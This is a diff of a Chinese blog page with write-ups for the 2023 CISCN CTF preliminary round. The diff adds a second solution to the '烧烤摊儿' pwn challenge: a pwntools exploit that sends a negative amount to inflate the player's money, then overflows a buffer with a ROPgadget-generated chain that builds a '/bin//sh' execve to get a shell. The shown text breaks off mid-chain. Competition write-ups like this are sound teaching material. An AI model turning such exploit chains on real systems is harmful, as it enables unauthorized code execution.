@@ -59,7 +59,7 @@
     "keywords": ["CTF","PWN","reverse","Crypto"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "1691"
+    "wordCount": "2572"
   }]
   </script>
 <meta content="ta0lve" name="author"/>
@@ -283,7 +283,7 @@
     </h1>
 <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
 <div class="flex flex-row flex-wrap items-center">
-<time datetime="2023-06-30 00:00:00 +0000 UTC">June 30, 2023</time><span class="px-2 text-primary-500">·</span><span>1691 字</span><span class="px-2 text-primary-500">·</span><span title="预计阅读">4 分钟</span>
+<time datetime="2023-06-30 00:00:00 +0000 UTC">June 30, 2023</time><span class="px-2 text-primary-500">·</span><span>2572 字</span><span class="px-2 text-primary-500">·</span><span title="预计阅读">6 分钟</span>
 </div>
 <div class="flex flex-row flex-wrap items-center">
 <span class="mr-2" onclick="window.open(&quot;/categories/wp/&quot;,'_self');" style="margin-top:0.5rem">
@@ -364,15 +364,16 @@
 <div class="min-w-[220px] py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
 <nav id="TableOfContents">
 <ul>
-<li>
+<li><a href="#pwn-烧烤摊儿">pwn-烧烤摊儿</a>
 <ul>
-<li><a href="#pwn-烧烤摊儿">pwn-烧烤摊儿</a></li>
+<li><a href="#解法一">解法一</a></li>
+<li><a href="#解法二">解法二</a></li>
+</ul>
+</li>
 <li><a href="#pwn-funcanary">pwn-funcanary</a></li>
 <li><a href="#reverse-babyre">reverse-babyre</a></li>
 <li><a href="#crypto-基于国密sm2算法">Crypto-基于国密SM2算法</a></li>
 <li><a href="#crypto-sign_in_passwd">Crypto-Sign_in_passwd</a></li>
-</ul>
-</li>
 </ul>
 </nav>
 </div>
@@ -383,15 +384,16 @@
 <div class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
 <nav id="TableOfContents">
 <ul>
-<li>
+<li><a href="#pwn-烧烤摊儿">pwn-烧烤摊儿</a>
 <ul>
-<li><a href="#pwn-烧烤摊儿">pwn-烧烤摊儿</a></li>
+<li><a href="#解法一">解法一</a></li>
+<li><a href="#解法二">解法二</a></li>
+</ul>
+</li>
 <li><a href="#pwn-funcanary">pwn-funcanary</a></li>
 <li><a href="#reverse-babyre">reverse-babyre</a></li>
 <li><a href="#crypto-基于国密sm2算法">Crypto-基于国密SM2算法</a></li>
 <li><a href="#crypto-sign_in_passwd">Crypto-Sign_in_passwd</a></li>
-</ul>
-</li>
 </ul>
 </nav>
 </div>
@@ -439,10 +441,16 @@
 <div class="min-w-0 min-h-0 max-w-prose">
 <p>以下为2023信安国赛初赛的pwn，reverse和Crypto的部分题</p>
 <div class="anchor" id="pwn-烧烤摊儿"></div>
-<h3 class="relative group">pwn-烧烤摊儿 
+<h2 class="relative group">pwn-烧烤摊儿 
     <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
 <a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#pwn-%e7%83%a7%e7%83%a4%e6%91%8a%e5%84%bf" style="text-decoration-line: none !important;">#</a></span>
+</h2>
+<div class="anchor" id="解法一"></div>
+<h3 class="relative group">解法一 
+    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e8%a7%a3%e6%b3%95%e4%b8%80" style="text-decoration-line: none !important;">#</a></span>
 </h3>
+<p>构造rop链 ret2syscall</p>
 <div class="highlight"><pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">is_debug</span> <span class="o">=</span> <span class="mi">1</span>
@@ -459,9 +467,7 @@
 </span></span><span class="line"><span class="cl"><span class="n">taolve</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"&gt;"</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">taolve</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">"1"</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">taolve</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">taolve</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">taolve</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">taolve</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"><span class="n">taolve</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">"1"</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">taolve</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
@@ -497,11 +503,134 @@
 </span></span><span class="line"><span class="cl"><span class="n">taolve</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">taolve</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">taolve</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><div class="anchor" id="解法二"></div>
+<h3 class="relative group">解法二 
+    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e8%a7%a3%e6%b3%95%e4%ba%8c" style="text-decoration-line: none !important;">#</a></span>
+</h3>
+<p>也可以直接利用ROPgadget自动生成ropchain</p>
+<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ROPgadget --binary pwn --ropchain
+</span></span></code></pre></div><p>exp如下：</p>
+<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">is_debug</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">is_remote</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">is_debug</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">'debug'</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">is_remote</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">taolve</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">"123.56.135.185"</span><span class="p">,</span> <span class="mi">31924</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">taolve</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">'./pwn'</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">taolve</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"&gt;"</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">taolve</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">"1"</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">taolve</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">taolve</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">"1"</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">taolve</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 通过负数来增加自己的钱的数量，使得之后有足够的钱来承包烧烤摊</span>
+</span></span><span class="line"><span class="cl"><span class="n">taolve</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">"-100000"</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">taolve</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"&gt;"</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">taolve</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">"4"</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">taolve</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"&gt;"</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">taolve</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">"5"</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mi">40</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'a'</span> <span class="o">*</span> <span class="n">offset</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x000000000040a67e</span><span class="p">)</span> <span class="c1"># pop rsi ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x00000000004e60e0</span><span class="p">)</span> <span class="c1"># @ .data</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000458827</span><span class="p">)</span> <span class="c1"># pop rax ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'/bin//sh'</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x000000000045af95</span><span class="p">)</span> <span class="c1"># mov qword ptr [rsi], rax ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x000000000040a67e</span><span class="p">)</span> <span class="c1"># pop rsi ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x00000000004e60e8</span><span class="p">)</span> <span class="c1"># @ .data + 8</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000447339</span><span class="p">)</span> <span class="c1"># xor rax, rax ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x000000000045af95</span><span class="p">)</span> <span class="c1"># mov qword ptr [rsi], rax ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x000000000040264f</span><span class="p">)</span> <span class="c1"># pop rdi ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x00000000004e60e0</span><span class="p">)</span> <span class="c1"># @ .data</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x000000000040a67e</span><span class="p">)</span> <span class="c1"># pop rsi ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x00000000004e60e8</span><span class="p">)</span> <span class="c1"># @ .data + 8</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x00000000004a404b</span><span class="p">)</span> <span class="c1"># pop rdx ; pop rbx ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x00000000004e60e8</span><span class="p">)</span> <span class="c1"># @ .data + 8</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x4141414141414141</span><span class="p">)</span> <span class="c1"># padding</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000447339</span><span class="p">)</span> <span class="c1"># xor rax, rax ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
